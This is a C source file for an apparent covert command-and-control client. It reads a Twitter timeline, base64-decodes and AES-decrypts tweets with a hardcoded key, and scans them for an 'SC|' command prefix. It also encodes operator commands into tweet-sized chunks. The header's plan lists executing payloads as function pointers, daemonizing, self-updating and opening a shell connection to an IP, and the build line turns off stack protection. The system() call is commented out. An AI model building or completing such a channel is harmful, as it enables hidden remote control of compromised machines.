/**
 * https://dev.twitter.com/rest/reference/get/statuses/user_timeline
 * http://pixelrobotics.com/2013/01/consuming-the-twitter-public-stream-with-libcurl/
 * https://curl.haxx.se/libcurl/c/getinmemory.html
 * http://stackoverflow.com/questions/21023605/initialize-array-of-strings
 * Compile with:
 *
 * "Base64 encodes each set of three bytes into four bytes. In
 * addition the output is padded to always be a multiple of four.
 *
 * gcc -g get.c base64decode.c base64encode.c -o get -lcrypto -loauth -lcurl -Og -foptimize-sibling-calls -fno-stack-protector -z execstack
 *
 * @TODO: (In Progress) Pull latest tweets from a twitter feed (/) Hit
 * Twitter API (/) Store CURL results in memory (/) Use environment
 * variables for credentials (/) Copy tweets into an array in memory
 * (/) Save Base64 encoded bodies only into memory (/) Base64 decode
 * tweet (/) Encode/Decode tweet... Choose cipher AES-256 (*) Divide
 * commands longer than 140 chars over multiple tweets This has turned
 * out to be an interesting problem. If you encode everything and then
 * divide into tweets we end up with seg faults when trying to
 * decrypt. This seems to make sense as the integrity of the
 * information which is likely used in the decoding has been damaged.
 * To address this we will actually need to encrypt each tweet
 * individually on the front side. To do this, we will need to
 * pre-calc how big the encoded tweet would be and break the tweet
 * smaller if necessary
 *
 * (*) Re-assemble commands longer than 140 chars from multiple tweets
 * (*) Cast as function pointer and execute (*) Schedule on a cadence
 * (*) Run as a daemon (*) Update binary (*) Initiate shell connection
 * to IP (*) Devise way to spin off connections to each client (*)
 * Keep state of last action performed (*) Replace libcurl with pure
 * socket IO (*) Statically link liboauth (*) Replace liboauth with
 * pure c?
 **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <oauth.h>
#include <curl/curl.h>
#include <math.h>
#include "base64encode.h"
#include "base64decode.h"
#include "aesencrypt.h"
#include "aesdecrypt.h"
#include "umamicrypt.h"

#define TWEET_COUNT 11
#define TWEET_LENGTH 141
#define MAX_TWEET_LENGTH 80
#define DATAFILE "tweetdata.json"
#define KEY "01234567890123456789012345678901"
#define IV "01234567890123456"
#define CMDPREFIX "SC|"

struct MemoryStruct {
    char *memory;
    size_t size;
} chunk;

typedef enum { LIVE_MODE, OFFLINE_MODE, ACQUIRE_MODE } AppMode_t;

char **TWEETS;

void InitializeTweets(void)
{
    // allocate space for 10 pointers to tweets(strings)
    TWEETS = (char**)malloc(TWEET_COUNT*sizeof(char*));
    int i = 0;
    //allocate space for each tweet(string)
    // here allocate TWEET_LENGTH bytes
    for(i = 0; i < TWEET_COUNT; i++){
        printf("Initializing %d bytes for tweet: %d\n", TWEET_LENGTH,i);
        TWEETS[i] = (char*)malloc(TWEET_LENGTH*sizeof(char));
        memset(TWEETS[i], 0, sizeof(TWEETS[i]));
    }
}

static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if(mem->memory == NULL) {
        /* out of memory! */
        printf("not enough memory (realloc returned NULL)\n");
        return 0;
    }

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

void TwitterConnect(AppMode_t m)
{
    FILE *out;
    const char *ckey = getenv("CKEY");
    const char *csecret = getenv("CSECRET");
    const char *atok = getenv("ATOK");
    const char *atoksecret = getenv("ATOKSECRET");

    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();

    const char *url = "https://api.twitter.com/1.1/statuses/user_timeline.json?user_id=blischalk&count=10";

    // URL, POST parameters (not used in this example), OAuth signing method, HTTP method, keys
    char *signedurl = oauth_sign_url2(url, NULL, OA_HMAC, "GET", ckey, csecret, atok, atoksecret);

    // URL we're connecting to
    curl_easy_setopt(curl, CURLOPT_URL, signedurl);

    // User agent we're going to use, fill this in appropriately
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "appname/0.1");

    // libcurl will now fail on an HTTP error (>=400)
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1);


    if (m == ACQUIRE_MODE) {
        out = fopen(DATAFILE, "w");
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)out);
    } else {
        chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
        chunk.size = 0;    /* no data at this point */
        /* send all data to this function  */
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    }

    /* get it! */
    int res = curl_easy_perform(curl);

    /* check for errors */
    if(res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
    }


    if (m == ACQUIRE_MODE)
        fclose(out);

    curl_easy_cleanup(curl);
    curl_global_cleanup();
}

/**
 * Populates either a file or memory from
 * Twitter API
 **/

void PopulateTweets(char *tweet_data, int tweets_index)
{
    // Look for a tweet body
    // this is fragile and we are lucky that the body of a tweet
    // happens to follow this pattern uniquely
    char *tweet_pt = strstr(tweet_data, ",\"text\":");

    // If a tweet body found
    if (tweet_pt != NULL)
    {
        // Move pointer forward to beginning of tweet body text
        tweet_pt = tweet_pt+9;

        // Locate the end of the tweet body
        char *tweet_end = strstr(tweet_pt, "\"");

        int char_index = 0;

        // Copy each character of the tweet into
        // Tweets
        //printf("Tweets index: %d\n", tweets_index);
        while(tweet_pt != tweet_end)
        {
            //printf("%c", *tweet_pt);
            TWEETS[tweets_index][char_index] = *tweet_pt;
            tweet_pt = tweet_pt+1;
            char_index++;
        }
        //printf("\n");
        PopulateTweets(tweet_end, (tweets_index+1));
    }
}

int DecryptTweet(unsigned char decryptedresult[], char * tweet)
{
    int counter;
    char* base64DecodeOutput;

    Base64Decode(&base64DecodeOutput, tweet);
    strlen((const char *)base64DecodeOutput);

    //printf("Dumping Base64 Decoded Bytes\n");
    //for (counter=0; counter < base64DecodedLen; counter++)
    //{
    //  printf("\\x%.2x",base64DecodeOutput[counter]);
    //}
    //printf("\n");

    /* Buffer for the decrypted text */
    //unsigned char decryptedtext[10000];

    int decryptedtext_len, ciphertext_len;
    unsigned char decryptedtext[10000];

    ///* A 256 bit key */
    unsigned char *key = (unsigned char *)KEY;

    ///* A 128 bit IV */
    unsigned char *iv = (unsigned char *)IV;

    ///* Initialise the library */
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    ciphertext_len = strlen(base64DecodeOutput);

    ///* Decrypt the ciphertext */
    decryptedtext_len = decrypt(base64DecodeOutput, ciphertext_len, key, iv,
                                decryptedtext);

    printf("decrypt length with error is: %d", decryptedtext_len);

    decryptedtext[decryptedtext_len] = '\0';

    strcpy(decryptedresult, decryptedtext);

    /* Clean up */
    EVP_cleanup();
    ERR_free_strings();
    return decryptedtext_len;
}

void ExecuteTweet(int tweet_index, unsigned char decryptedtext[])
{
    // Decrypt here
    int decrypted_length;
    int counter;
    char * found_prefix;

    decrypted_length = DecryptTweet(decryptedtext, TWEETS[tweet_index]);
    found_prefix = strstr(decryptedtext, CMDPREFIX);

    for (counter=0; counter < decrypted_length; counter++)
    {
      printf("\\x%02x", decryptedtext[counter]);
    }

    if (found_prefix != NULL)
    {
        printf("found prefix\n");
        //system(decryptedtext);
    } else {
        printf("found not found prefix\n");
        ExecuteTweet(tweet_index+1, decryptedtext);
    }
}

char * ReadTweetsFromFile()
{
    char *file_contents;
    long input_file_size;
    FILE *input_file = fopen(DATAFILE, "rb");
    fseek(input_file, 0, SEEK_END);
    input_file_size = ftell(input_file);
    rewind(input_file);
    file_contents = malloc(input_file_size * (sizeof(char)));
    fread(file_contents, sizeof(char), input_file_size, input_file);
    fclose(input_file);
    return file_contents;
}

void Acquire()
{
    TwitterConnect(ACQUIRE_MODE);
}

void Live()
{

    InitializeTweets();
    TwitterConnect(LIVE_MODE);
    PopulateTweets(chunk.memory,0);
    printf("About to call ExecuteTweet\n");
    //ExecuteTweet();
}

void Offline()
{
    unsigned char decryptedtext[10000];
    InitializeTweets();
    PopulateTweets(ReadTweetsFromFile(),0);
    ExecuteTweet(0, decryptedtext);
}

int DivideIntoTweets(char dest[][TWEET_LENGTH], char * payload, int length)
{

    int divisions;
    int i;
    int bytesLeft = length;
    int chunkSize = length;
    divisions = (int) ceil((double)length / MAX_TWEET_LENGTH);
    for(i=0; i<divisions;i++)
    {
        if (bytesLeft > MAX_TWEET_LENGTH)
        {
            chunkSize = MAX_TWEET_LENGTH;
        }
        else
        {
            chunkSize = bytesLeft;

        }

        memset(dest[i], 0, TWEET_LENGTH);
        strncpy(dest[i], payload, chunkSize);
        bytesLeft = bytesLeft - chunkSize;
        payload = payload + chunkSize;
    }

    return divisions;
}

int AddPrefix(char * dest, char * payload)
{
    strcat(dest, CMDPREFIX);
    strcat(dest, payload);
    return strlen(dest);
}

void EncodeTweets(char dest[][TWEET_LENGTH], char src[][TWEET_LENGTH], int tweetCount)
{
    int i;
    int length;
    char * base64Encode;
    for(i=0; i<tweetCount; i++)
    {
        length = Encode(&base64Encode, src[i], (unsigned char *)KEY, (unsigned char *)IV);
        strncpy(dest[i], base64Encode, length);
    }
}


int main(int argc, char *argv[])
{
    int opt,tweetCount;
    char prefixed[1024] = { 0 };
    char divided[TWEET_COUNT][TWEET_LENGTH];
    char encoded[TWEET_COUNT][TWEET_LENGTH];

    while ((opt = getopt(argc, argv, "loae")) != -1) {
        switch (opt) {
        case 'a':
            Acquire();
            break;
        case 'l':
            Live();
            break;
        case 'o':
            Offline();
            break;
        case 'e':
            AddPrefix(prefixed, argv[2]);
            tweetCount = DivideIntoTweets(divided, prefixed, strlen(prefixed));
            int i;
            EncodeTweets(encoded, divided, tweetCount);

            printf("|------ Your Tweets Are ------|\n");
            for(i=0;i<tweetCount;i++)
                printf("%s\n\n",encoded[i]);

            break;
        default:
            fprintf(stderr, "Usage: %s [-loae] \n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    // Cleanup struct that was allocated
    free(chunk.memory);
    return 0;
}
